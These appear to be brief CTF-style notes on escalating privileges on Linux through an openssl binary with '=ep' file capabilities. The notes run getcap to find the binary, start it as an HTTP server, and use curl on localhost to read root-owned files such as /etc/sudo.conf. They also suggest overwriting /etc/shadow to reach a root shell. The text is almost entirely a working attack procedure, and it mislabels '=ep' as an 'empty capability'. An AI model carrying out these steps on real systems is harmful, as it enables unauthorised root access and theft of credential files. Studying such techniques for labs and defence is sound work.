1. getcap -r / 2>/dev/null
2. Specifically looking at /home/user/openssl =ep
3. This means it's an empty capability
4. Bascially we can run it from the root directory and it can inherit privileges when it runs and we get it all!!!
5.  /home/user/openssl s_server -key /tmp/key.pem -cert /tmp/cert.pem -port 1337 -HTTP
6. Remember run it from where it is stored in this case our home directory and not from /usr/bin
7. Connect to the machine from another low-priv user shell
8. curl -k "https://127.0.0.1:1337/etc/sudo.conf"
9. You have all the files you need.
10. you can write to /etc/shadow if you'd like spawn/escalate to a root shell.
